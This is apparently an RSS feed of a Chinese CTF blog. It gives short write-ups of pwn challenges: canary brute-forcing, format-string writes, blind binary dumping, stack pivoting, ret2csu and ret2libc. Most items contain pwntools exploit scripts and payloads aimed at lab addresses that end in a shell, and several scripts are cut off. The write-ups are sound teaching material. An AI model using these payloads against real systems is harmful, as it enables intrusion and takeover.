<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>ctf on CAI dog</title>
    <link>https://jellyfish-pro.github.io/ctf/</link>
    <description>Recent content in ctf on CAI dog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language><atom:link href="https://jellyfish-pro.github.io/ctf/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>[置顶] 注意事项</title>
      <link>https://jellyfish-pro.github.io/ctf/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</guid>
      <description>由于不可抗因素，以下的ctf不会提供二进制文件，并且一些文章的结构会有所缺失，请理解 </description>
    </item>
    
    <item>
      <title>enumcanary</title>
      <link>https://jellyfish-pro.github.io/ctf/enumcanary/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/enumcanary/</guid>
      <description>首先拿到文件我们先查看保护机制：
可以看到，这道题是打开了栈溢出检测的。
然后我们运行程序（首先要在当前目录下创建一个flag文件，否则会报错）：
可以看到程序实现了一个类似于客户端的效果。如果我们利用nc指令进行连接的话：
程序会让我们输入一串字符（这里输入的时aaaa），然后返回Message received!
然后通过ida我们可以看到程序会打开一个‘./flag’文件：
这里可以看到，通过read函数，将flag读入到了0x602120这个地址。
然后在别的地方，我们也可以看到一个send函数，会将0x602120这个地址里的东西发送出去：
最后我们看到main函数，通过main函数，可以了解到这个程序就是类似于客户端，如果有连接，就会通过fork函数复制一个新的进程，让连接访问这个复制出来的新进程。
对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的。因为内存布局是一样的，所以canary也一定是一样的。
爆破canary的基本逻辑为：
我们知道程序在结束时，会判断canary是否发生改变，如果改变，就会输出**“* stack smashing detected *”，然后程序就会终止。程序终止，在我们客户端上的表现就是，接收不到任何的数据，但是如果canary没有改变，我们客户端就会接收到服务器端发送的Message received!。那么我们就可以通过特征，来对canary进行一位一位的爆破。首先canary的最低为一定为‘\x00’，所以我们从第二位开始爆破，第二位从&amp;quot;\x00&amp;quot;开始，逐一增加，如果错误，则接收不到回响，如果正确就接受到Message received!**，所以如果有接收，就爆破下一位。
假如canary如图：
我们按位进行爆破：
那么，我们就可以通过fork函数，对canary进行爆破：
from pwn import *context.log_level = &amp;#39;debug&amp;#39;canary = b&amp;#34;\x00&amp;#34;padding = b&amp;#34;a&amp;#34;*264for x in range(7):for y in range(1,0x100):p = remote(&amp;#34;127.0.0.1&amp;#34;,10011)print(p.recv())p.send(padding+canary+ bytes([y]))try:info = p.recv()print(info)except:p.close()continuep.close()breakcanary += bytes([y])print(&amp;#34;success get blasting!&amp;#34;)print(&amp;#39;type =&amp;#39;,type(canary))print(canary) 这里我们先在本地进行连接，实验一下爆破canary的exp：
可以看到canary被爆出来了。然后利用这个canary，构造ROP将flag输出出来：</description>
    </item>
    
    <item>
      <title>format0</title>
      <link>https://jellyfish-pro.github.io/ctf/format0/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format0/</guid>
      <description>首先我们检查保护机制：
我们可以看到有canary，可以修改got表。
这里我们第一反应应该是采用泄露canary和修改got表的办法。
但是我们运行文件可以发现，程序并不是一个无线循环的程序，意思就是我们虽然可以泄露canary，但是输入canary之后程序就结束了，并不能将canary利用起来。
由此我们可以知道，这是一个只能使用一次的格式化字符串漏洞。
然后我们进入IDA查看这个文件：
我们可以清楚的看到程序的逻辑，就是生成两个随机数后相加，然后与我们输入的字符进行比较，如果相同就给我们shell。
因为v5和s两个变量是随机生成的数字。所以我们只能通过格式化字符串来修改v2的值。
我们到GDB中调试查看一下程序具体的流程：
在memset函数这里初始化了两个栈空间：
然后两个read函数读取两个随机字符到刚刚初始化的两个栈空间中
然后程序让我们输入v2字符串，放到栈空间中去：
然后就是比较我们输入的v2和刚刚两个随机字符的和是否相等：
程序的流程就是这样了，接下来我们需要了解格式化字符串的一个符号
%*k$c%x$n %*k$c的含义就是：输出格式化字符串第k个变量个字符。
x %*k$c%x$n的含义是：将输出格式化字符串第k个变量个字符的个数写入格式化字符串第x个变量指向的地址中
而在这道题中，我们可以看到两个随机数的偏移量为10和11，而存放v2的栈空间的偏移量为9，所以我们payload为：
payload = b&amp;#39;%*10$c%*11$c%9$lln&amp;#39; 这样写就表示，先输出第10个偏移量中的值这么多个字符，再输出第11个偏移量中的值这么多个字符，最后将一共输出的字符存放在第九个偏移量中所指向的地址
完整的exp为：
from pwn import *#context.log_level = &amp;#39;debug&amp;#39;#p = process(&amp;#39;./format0&amp;#39;)p = remote(&amp;#39;10.0.25.109&amp;#39;,20000)if args.G:gdb.attach(p)p.recvuntil(&amp;#39;your name:&amp;#39;)payload = b&amp;#39;%*10$c%*11$c%9$lln&amp;#39;p.sendline(payload)p.recvuntil(&amp;#39;you shell...&amp;#39;)p.sendline(&amp;#39;a&amp;#39;)p.interactive() </description>
    </item>
    
    <item>
      <title>format1</title>
      <link>https://jellyfish-pro.github.io/ctf/format1/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format1/</guid>
      <description>首先我们查看一下保护机制：
可以看到，这道题是打开了canary保护。之前做stack smaches时，我们了解了如何利用canary溢出报错来打印我们需要的flag。
canary检测机制 虽然当时我们了解到，canary检测到溢出之后，会调用stack_chk_fail函数，并且在这个函数里打印字符串。但是，我们当时并没有说明。canary保护是怎么检测到溢出的，现在利用这道题，我们可以了解一下canary检测方式和绕过canary的方法。
通过IDA我们可以发现，这个函数的功能函数有俩个gets函数：
v1的大小为30h（48个字节）
我们知道，gets函数有着溢出的风险，那么通过这俩个gets函数，我们来看一看canary是如何检测溢出的。
首先我们在gets函数和printf函数处打上断点。
然后来到第一个gets函数里，步进到_IO_getline函数处：
这里我们随便输入一个不会产生溢出的值，我输入的为‘as&#39;
输入之后，利用stack 20指令查看栈空间,找到程序存放‘as’的地方：
在上面查看IDA时，我们发现存放字符的空间大小为30h（48字节）。那么，在栈空间里，字符可以存放的大小为：48/8=6排。
可以看到，在图中我们输入的值后的第六排，有一个八个字符、以\x00结尾的无规律字符串0x9a05e8afeb322300。
这个八位字符，就是canary生成的检测字符，如果这个字符改变，则canary就会在程序结束时调用stack_chk_fail函数。canary不是固定的，但最后一个字节一定是\x00。
我们在gdb里观察一下：
我们可以正常返回main函数：
然后我们使用c指令，来到第二个gets函数处，这里我们尝试溢出来改变canary的值。
可以看到这里canary已经改变了，接着我们接着执行：
在程序结束时，程序调用了stack_chk_fail函数。
绕过canary 因为canary保护需要检测canary的值有没有被改变。那么我们在构造payload时，将原本的canary值放到canary本来的地址上，就好了。
利用printf函数泄露canary值 因为canary每次都不同，意味着我们每次都需要改变canary的值。
那么如何获得程序中canary的值呢。
这里我们就可以利用printf函数来进行泄露。
%n$p //n代表第几个参数，p表示打印的是一个地址。 我们在gdb中查看，canary是第几个参数：
因为64为前6个参数通过寄存器传递，所以是这里第10个。
接着我们尝试输入%10$p尝试一下：
可以看到，并不是canary，而是canary上方的地址，说明我们应该输入%11$p
构造exp 接下来我们就可以构造exp了：
sys_addr = 0x4006E7	//system函数地址payload1 = &amp;#39;%11$p&amp;#39;p.sendline(payload1)canary =int( p.recv(18),base = 16)	//将接收到的canary转化为16进制的int类型print(&amp;#39;canary =&amp;#39;,hex(canary))canary_val = canary.to_bytes(9,&amp;#39;little&amp;#39;)	//将int类型的canary转为bytes #format1from pwn import *#p = process(&amp;#39;./format1&amp;#39;)p = remote(&amp;#39;10.0.25.109&amp;#39;,20000)a = 0x400760if args.</description>
    </item>
    
    <item>
      <title>format2_new</title>
      <link>https://jellyfish-pro.github.io/ctf/format2_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format2_new/</guid>
      <description>我们首先还是先远程连接一下这个程序：
发现程序的逻辑为输入什么就输出什么。
那我们修改一下dump脚本，直接泄露：
from pwn import *proc = &amp;#39;./format2&amp;#39;#context.log_level = &amp;#39;debug&amp;#39;def leak(b_addr , a):#p = process(proc)p = remote(&amp;#39;10.0.25.109&amp;#39;,20001)b_addr1 = str(hex(b_addr))print(&amp;#39;b_addr1 =&amp;#39;,hex(b_addr))if b_addr1[-2:] == &amp;#39;0a&amp;#39;:info = b&amp;#34;\x00&amp;#34;else:pad = b&amp;#39;%7$s.tmp&amp;#39;+p64(b_addr)#gdb.attach(p)p.sendline(pad)p.recvuntil(&amp;#39;me!&amp;#39;)p.recvuntil(&amp;#39;\n&amp;#39;)info = p.recvuntil(&amp;#39;.tmp&amp;#39;, drop=True)if not info :info = b&amp;#34;\x00&amp;#34;p.close()return infob_addr = 0x400680b_end = 0x400a00res = b&amp;#39;&amp;#39;a = 0while b_addr&amp;lt;b_end:info = b&amp;#39;&amp;#39;info = leak(b_addr,a)print(&amp;#39;leak = &amp;#39;,info)a +=1b_addr += len(info)res += infoprint(&amp;#39;leak_addr = &amp;#39;,hex(b_addr))#print(&amp;#39;res = &amp;#39;,res)print(&amp;#34;dump length is: &amp;#34;, len(res))with open(&amp;#34;dump_file2&amp;#34;, &amp;#34;wb&amp;#34;) as f:f.</description>
    </item>
    
    <item>
      <title>format2_old</title>
      <link>https://jellyfish-pro.github.io/ctf/format2_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format2_old/</guid>
      <description>这道题是一道blind-pwn，也就是盲打。不会提供binary，需要我们利用格式化字符串对binary进行泄露。因为格式化字符串泄露的为内存空间，所以泄露出来的binary可能会存在混乱、残缺等问题。
首先我们先连接一下这道题：
注：因为32位的远程连接已经替换为64位，所以我们使用本地文件模拟泄露。 打开文件后，显示字符串“ping me”
然后我们随意输入字符，程序都会输出我们输入的字符：
如果不输入字符串直接回车的话，就会显示哭泣：
那么根据格式化字符串的原理，我们需要知道其偏移量，也就是我们输入的字符串是放在相对于格式化字符串的第几个参数。
我们使用下面的指令查看：
aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 可以看到，是第七个参数。
我们再尝试输入
bbbb%7$p 程序讲bbbb的十六进制输出了出来，证明偏移量的确是7。
知道了偏移量接下来就是泄露binary文件：
from pwn import *proc = &amp;#39;./format2&amp;#39;def leak(b_addr , a):p = process(proc)pad = b&amp;#39;%9$s.tmp&amp;#39;+p32(b_addr)p.sendline(pad)p.recvuntil(&amp;#39;me&amp;#39;)p.recvuntil(&amp;#39;\n&amp;#39;)info = p.recvuntil(&amp;#39;.tmp&amp;#39;, drop=True)if not info :info = b&amp;#34;\x00&amp;#34;p.close()return infob_addr = 0x8048000b_end = 0x0804A000res = b&amp;#39;&amp;#39;a = 0try:while b_addr &amp;lt;= b_end:info = b&amp;#39;&amp;#39;print(&amp;#39;leak2 = &amp;#39;,info)info = leak(b_addr,a)print(&amp;#39;leak = &amp;#39;,info)a +=1b_addr += len(info)res += infoprint(&amp;#39;leak_addr = &amp;#39;,hex(b_addr))#print(&amp;#39;res = &amp;#39;,res)except Exception as e:print(e)	print(&amp;#34;dump length is: &amp;#34;, len(res))with open(&amp;#34;dump_file1&amp;#34;, &amp;#34;wb&amp;#34;) as f:f.</description>
    </item>
    
    <item>
      <title>format3_new</title>
      <link>https://jellyfish-pro.github.io/ctf/format3_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format3_new/</guid>
      <description>首先检查保护机制：
不能修改got表，有栈溢出检测
接着运行一下程序：
程序会让我们分别输入两次，然后再打印分别将两次输入打印出来。
我们输入什么就会输出什么，这里可能存在格式化字符串的漏洞，我们接下来将二进制文件拖进IDA中：
在IDA中我们很容易看到，在main函数里调用了有两个格式化漏洞的函数。同时为了方便下文引用，将这个函数重命名为func。
同时，我们也可以在文件中找到一个system函数：
那么现在这道题思路就是：
1. 利用第一个printf函数泄露func函数的rbp
2. 通过rbp，定位存放func函数的返回地址的地址
3. 利用第二个printf函数的格式化字符串漏洞，修改返回地址为system函数
首先我们泄露main函数调用func函数时，压入的rbp。
我们进入gdb，将断点打在func函数处，然后步进到第一个printf函数处，然后查看栈信息：
可以看到rbp相对于格式化字符串的偏移量为：44，所以我们泄露rbp的exp为：
from pwn import *context.log_level=&amp;#34;debug&amp;#34;#p=process(&amp;#34;./format3&amp;#34;)p = remote(&amp;#39;10.0.25.109&amp;#39;,20003)payload = &amp;#39;%44$p&amp;#39;sys_addr = 0x400817#gdb.attach(p)	//因为内存地址随时会变，所以需要进入gdb查看输出是否正确p.recvuntil(&amp;#39;name:&amp;#39;)p.sendline(payload)p.recvuntil(&amp;#39;\n&amp;#39;)leak = int(p.recvuntil(&amp;#39;Please&amp;#39;,drop = True),base = 16)print(&amp;#39;leak =&amp;#39;,hex(leak))	//泄露出来的rbpret_addr = leak - 0x8	//rbp的地址减去8，就是func函数返回地址所在值print(&amp;#39;ret_addr =&amp;#39;,hex(ret_addr)) 可以看到无论是泄露的内存地址，还是存放func返回值的地址都是匹配的。
然后我们就需要利用第二个printf函数将返回值改为system函数的地址：
可以看到返回值为0x40098c，system函数地址为0x400817只有两个字节不同，所以我们使用%hn进行修改
0x0817 = 2071，所以我们需要输出2071个字符
payload2 =b&amp;#39;%2071c%12$hnaaaa&amp;#39; //最后四个‘a’,是用来填充内存的，试内存得以对齐payload2 += p64(ret_addr) 完整的exp：
from pwn import *context.</description>
    </item>
    
    <item>
      <title>format3_old</title>
      <link>https://jellyfish-pro.github.io/ctf/format3_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format3_old/</guid>
      <description>首先查看保护机制：
可以看到got表不能修改，没有栈溢出检查和地址随机化
按照之前的流程，我们接下来会将程序拖入IDA中查看，但是这个程序在拖入IDA之前，我建议先运行一下，查看一下程序的流程。这样做的原因是，这道题有着较多功能函数，如果直接放入IDA，容易被绕晕。
运行程序首先是打印几排字符串，让我们先注册：
我们注册后会显示注册成功：
然后跳出菜单让我们选择：
三个选项，如果输入1，就会显示我们刚刚注册的账户：
如果选择2，则会让我们重新输入username和password：
如果选择3，则会退出。
然后我们再进入IDA中查看：
这里我已经将大部分函数按照其功能重新命名（注：这里我将打印username和password的函数取名为show）。
通过刚刚的运行，我们知道了，程序会让我们首先注册，然后如果我们选择1.Sh0w Account Infomation!，程序就会将我们输入的账户和密码输出出来。那么在这个地方，就可能存在格式化字符串漏洞。
我们在IDA中找到输出账户和密码的函数：
可以看到，这个函数有两个printf函数，那么这里就可以利用格式化字符串漏洞。
同时，我们可以在IDA中找到，system函数：
然后我们进入gdb，断点打在show函数处，查看偏移量：
可以看到，我们输入的字符串在第8个偏移量（0x7fffffffdcd0）。同时根据函数调用的知识，我们可以判断，第7个偏移量为show函数的返回值，第6个偏移量为上一个函数的rbp。如果可以修改这个返回值到system函数，那么我们就可getshell。
那么怎么修改返回值呢，我们可以使用修改got表的方式，来修改内存，我们只需要找到存放返回值的内存地址，就可以修改返回地址。
我们知道每次程序运行时内存地址是不固定的，但是根据函数调用的知识，我们知道，返回地址和存放上一个函数rbp的位置是固定的。那就是上面说到的第7个偏移量和第6个偏移量。然后我们利用第6个偏移量所存放的值(0x7fffffffdd00)，减去返回值所在的栈地址(0x7fffffffdcc8)：
0x7fffffffdd00 - 0x7fffffffdcc8 = 0x38 这样我们就得到了返回值所在的地址。
所以这里我们先泄露第6个偏移量的值，得到上一个函数的rbp，然后减去0x38，就是返回值所在的地址。
from pwn import *context.log_level=&amp;#34;debug&amp;#34;#p=process(&amp;#34;./format3&amp;#34;)p = remote(&amp;#39;10.0.25.109&amp;#39;,20003)binary=ELF(&amp;#34;format3&amp;#34;)#gdb.attach(sh)p.recvuntil(&amp;#39;Input your username(max lenth:20):&amp;#39;)p.sendline(&amp;#39;.tmp&amp;#39;)p.recvuntil(&amp;#39;Input your password(max lenth:20):&amp;#39;)p.sendline(&amp;#39;%6$p&amp;#39;)p.recvuntil(&amp;#39;Register Success!!\n&amp;#39;)p.sendline(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;.tmp\n&amp;#39;)rbp = int(p.recvline(),base = 16)print(&amp;#39;rbp = &amp;#39;,hex(rbp))ret_addr = rbp - 0x38print(&amp;#39;ret_addr = &amp;#39;,hex(ret_addr)) 得到返回值地址后，我们就要利用格式化字符串修改返回值。</description>
    </item>
    
    <item>
      <title>format4_new</title>
      <link>https://jellyfish-pro.github.io/ctf/format4_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format4_new/</guid>
      <description>首先我们查看保护机制：
可以看到，打开了canary。
接着我们运行程序：
程序的功能类似于一个记事本，输入‘1’添加消息，输入‘2’显示输入的消息。
因为程序会输出我们输入的东西，那么就有可能存在格式化字符串漏洞，我们输入连续的.%P进行尝试：
可以看到输出了内存中的值，那么我们就可以利用这个格式化字符串漏洞。
要利用格式化字符串漏洞，我们需要知道偏移量，这里我们进入gdb进行调试。
这里我们在格式化字符串漏洞处下断点（格式化字符串漏洞的地址可以在ida中进行查看）：
然后将程序跑起来：
输入message后，再选择“Show Message”。gdb就会将程序断在断点处：
我们可以看到，程序并没有将我们输入的字符串存放在栈中，而是存放在了一个很明显不是栈的地址。
通过vmmap指令，我们可以知道，这个地址是在堆中：
存放在了堆上，我们就不能通过泄露canary覆盖返回地址的方法了。
虽然我们不能使用栈溢出覆盖返回地址，但是我们可以使用leave栈迁移的方法，将栈转移到一个虚假的栈上。
leave = MOV RSP, RBPPOP RBP 通过这个指令会将RBP的值赋给RSP，那么如果我们将栈中的RBP的值给修改了，运行到leave指令时，RSP就会转跳到我们指定的地址。
所以，我们通过程序的写入功能，在堆上写入一个ROP链，使用格式化字符串的写入功能，改变RBP。然后利用leave指令，将栈迁移到ROP链的地址上。
使用这个方法，我们需要先泄露libc的版本，找到基地址、system函数的地址和“/bin/sh”字符串的地址。
在gdb中我们可以看到__libc_start_main函数的偏移量：
偏移量为0xf+6=21。
注：这里我们泄露出来的不是（______libc_start_main）而是（__libc_start_main+240）,所以泄露出来的地址需要减去240 from pwn import *context.log_level = &amp;#39;debug&amp;#39;#p = process(&amp;#39;format4&amp;#39;)p = remote(&amp;#39;10.0.25.109&amp;#39;,20004)pop_rdi_ret = 0x400c03def add(payload):lenth = len(payload)p.recvuntil(&amp;#39;Exit.&amp;#39;)p.sendline(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;Please enter your message length:&amp;#39;)p.sendline(str(lenth))p.recvuntil(&amp;#39;Please enter your Message:&amp;#39;)p.sendline(payload)#--------------------------------第一次输入--------------------------------------payload = b&amp;#39;%21$p.tmp&amp;#39;add(payload)p.recvuntil(&amp;#39;Exit.&amp;#39;)p.sendline(&amp;#39;2&amp;#39;)p.recvuntil(&amp;#39;Message3: 0x&amp;#39;)leak = int(p.</description>
    </item>
    
    <item>
      <title>format4_old</title>
      <link>https://jellyfish-pro.github.io/ctf/format4_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format4_old/</guid>
      <description>首先查看保护机制：
32位程序，开启了栈溢出保护和NX，可以修改got表
然后我们运行程序，查看程序的内容：
可以看到这个程序类似于建立通讯目录的功能，我们可以选择创建目录，溢出目录，编辑目录，展示目录，退出。
根据我们经验，我们可以猜测，我们可以在创建目录里输入格式化字符串的payload，然后再展示目录时利用格式化字符串：
然后我们在IDA中查看文件：
这里我将每个函数都根据内容重新命名了，因为我们知道了展示目录的选项中有格式化字符串漏洞，所以我们进入show函数就可以找到这个全是printf函数的函数（这里我将其命名为printff）：
现在，我们知道了格式化字符串，got表也是可以修改的，那么我们可以选择修改printf函数的got表为system函数了吗？
答案是否定的，因为这个程序不仅在这里使用了printf函数，在其他的功能里都使用了printf函数，如果直接修改got，并不能保证程序会按照我们的意愿进入system函数。
而且，在gdb调试中我们是可以看到，其实我们输入进程序的字符，并不是存在栈上的，而是存在于.bss段中，也就是堆中。
所以这道题我们不能直接利用%n修改栈中的值来获得shell。
那么我们可以换一个思路，首先利用程序，将在堆上构建一个虚假的栈，然后将函数ebp的值修改为虚假的栈的起始地址。
1.利用程序创建目录的功能，在堆上写入一个虚假的栈。2.利用格式化字符串，修改函数的ebp3.当函数返回时，栈地址就会来到我们构建的虚假地址。 通过IDA我们可以看到程序并没有system函数和/bin/sh
所以我们还是要泄露程序的libc版本：
from pwn import *sh = process(&amp;#39;./format4&amp;#39;)#sh = remote(&amp;#39;10.0.25.109&amp;#39;,20004)contact = ELF(&amp;#39;./format4&amp;#39;)#context.log_level = &amp;#39;debug&amp;#39;#通过创建目录选项，输入payloaddef createcontact(name, phone, descrip_len, description):sh.recvuntil(&amp;#39;&amp;gt;&amp;gt;&amp;gt; &amp;#39;)sh.sendline(&amp;#39;1&amp;#39;)sh.recvuntil(&amp;#39;Contact info: \n&amp;#39;)sh.recvuntil(&amp;#39;Name: &amp;#39;)sh.sendline(name)sh.recvuntil(&amp;#39;You have 10 numbers\n&amp;#39;)sh.sendline(phone)sh.recvuntil(&amp;#39;Length of description: &amp;#39;)sh.sendline(descrip_len)sh.recvuntil(&amp;#39;description:\n\t\t&amp;#39;)sh.sendline(description)#输入payload后利用printf函数展示结果def printcontact():sh.recvuntil(&amp;#39;&amp;gt;&amp;gt;&amp;gt; &amp;#39;)sh.sendline(&amp;#39;4&amp;#39;)sh.recvuntil(&amp;#39;Contacts:&amp;#39;)sh.recvuntil(&amp;#39;Description: &amp;#39;)printf = 0x08048BD1# get system addr &amp;amp; binsh_addrpayload = &amp;#39;%31$paaaa&amp;#39;createcontact(&amp;#39;1111&amp;#39;, &amp;#39;1111&amp;#39;, &amp;#39;111&amp;#39;, payload)printcontact()libc_start_main_ret = int(sh.</description>
    </item>
    
    <item>
      <title>ret2csuinit_new</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2csuinit_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2csuinit_new/</guid>
      <description>首先利用checksec命令查看保护机制：
64位，没有canary检测，没有地址随机化，got表可写。
然后放进IDA里进行看一下反编译：
我们可以看到plt表中调用的是write函数。
这样我们就可以通过write函数泄露函数地址：
64位同样需要我们构造gadget。
我们利用pwntools的ROPgadget指令查找gadget：
ROPgadget --binary format_base --only &amp;#39;pop|ret&amp;#39; 我们知道write函数需要传递三个参数，但是通过上图，我们发现我们只能传递两个参数。
如果不能保证参数个数，那么我们就不能保证函数掉用的成功率。
所以这时候我们又需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。
_libc_csu_init函数因为特殊的汇编构造，可以帮助我们调用三个参数的函数。
首先我们看到这个函数的汇编代码（这里的汇编代码并不是题目的汇编代码，题目可能会和这里给出的有所差别，但是原理是一样的）：
这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。
将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 +rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。
.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx	//设定为0.text:000000000040061B pop rbp	//设定为1.text:000000000040061C pop r12	//放入需要调用的函数地址.text:000000000040061E pop r13	//放入第三个参数.text:0000000000400620 pop r14	//放入第二个参数.text:0000000000400622 pop r15	//放入第三个参数.text:0000000000400624 retn	//返回到0x400600.text:0000000000400600 mov rdx, r13	//第三个参数放入rdx.text:0000000000400603 mov rsi, r14	//第二个参数放入rsi.</description>
    </item>
    
    <item>
      <title>ret2csuinit_old</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2csuinit_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2csuinit_old/</guid>
      <description>首先查看具体信息：
在程序中也没有system和/bin/sh
栈也不是可读可写可执行。
那我们选择通过泄露函数地址，来查找libc版本：
那么问题又来了，这个程序没有puts函数，只有write函数，需要3个参数，而在x64我们需要用到rdi，rsi，rdx，而在程序中我们并没有找到pop_rdx。
这时候我们就需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。
首先我们看到这个函数的汇编代码：
这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。
将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 +rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。
.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx	//设定为0.text:000000000040061B pop rbp	//设定为1.text:000000000040061C pop r12	//放入需要调用的函数地址.text:000000000040061E pop r13	//放入第三个参数.text:0000000000400620 pop r14	//放入第二个参数.text:0000000000400622 pop r15	//放入第三个参数.text:0000000000400624 retn	//返回到0x400600.text:0000000000400600 mov rdx, r13	//第三个参数放入rdx.text:0000000000400603 mov rsi, r14	//第二个参数放入rsi.text:0000000000400606 mov edi, r15d	//第一个参数放入rdi.text:0000000000400609 call qword ptr [r12+rbx*8]//因为rbx为0，所以只有r12.</description>
    </item>
    
    <item>
      <title>ret2libc1_new</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2libc1_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2libc1_new/</guid>
      <description>首先查看基本信息：
可以看到PIE未开启，但NX打开了。
说明.text段的地址固定，但内存不可执行。
因为是64位程序，所以我们需要考虑构造gadget
拖入IDA查看一些基本信息：
看到在main函数中，有一个gets函数，gets函数接收字符串时碰到&amp;rsquo;\n&amp;rsquo;才会停止接收，通过这个特性我们就可以构造足够长的字符串，使得栈溢出，从而覆盖程序原本的栈，达到控制程序的目的。
计算从接收第一个字符到函数返回值之间的偏移量：
然后在IDA中用shift+f12,查看字符串：
得到/bin/sh的地址。
然后继续查看汇编，我们可以看到有一个call system的指令
那么我们的思路就是，通过padding溢出到ret，然后让ret返回到call system的地址，让system调用/bin/sh的地址，这样就能够get shell。
这/bin/sh的地址和system的地址都得到了，但是这是64位的文件，是通过寄存器，所以我们不能像32位一样将参数写入栈就不管了。
所以这里我们不能通过将/bin/sh的地址放进栈中，而是要使用ROP找到指令将/bin/sh的地址放入寄存器rdi中：
现在所有的要素都收集齐了，我们再理一下：
payload = flat([&amp;#39;a&amp;#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)]) #ret2libc1from pwn import *#p = process(&amp;#34;./ret2libc1&amp;#34;)p = remote(&amp;#39;10.0.25.109&amp;#39;,10005)sys_addr = 0x400687bin_addr = 0x601048pop_rdi_ret = 0x400793#p.recvuntil(&amp;#34;Hello, what&amp;#39;s your name?\n&amp;#34;)react = &amp;#34;Hello, what&amp;#39;s your name?\n&amp;#34;payload = flat([&amp;#39;a&amp;#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)])#gdb.attach(p)#pause()#p.sendline(payload)p.sendlineafter(react,payload)p.interactive() </description>
    </item>
    
    <item>
      <title>ret2libc1_old</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2libc1_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2libc1_old/</guid>
      <description>首先查看相关信息
可以看到，32位，没有开启canary，没有开启PIE，但是打开了NX。
在IDA中我们可以看到system()函数：
得到system()函数地址之后，我们还需要得到/bin/sh字符的地址。
通过ROPgadget，我们可以查找到文件中是否存在/bin/sh字符：
现在system() 的地址，/bin/sh 的地址都有了。
接下来就是找到可利用的溢出点，算出到ret的偏移量：
利用cyclic生成200个字符：
shangdi4sb@ubuntu:~/pwntest/111$ cyclic 200aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab 用gdb打开ret2libc1，使用R命令让程序跑起来，输入生成的字符串，发现ret转跳到了奇怪的位置：
再利用cyclic计算偏移量：
shangdi4sb@ubuntu:~/pwntest/111$ cyclic -l 0x62616164112 现在我们知道了ret 的偏移量，知道了system()函数的地址，也知道了/bin/sh的地址，接下里就是需要将其连接到一起。
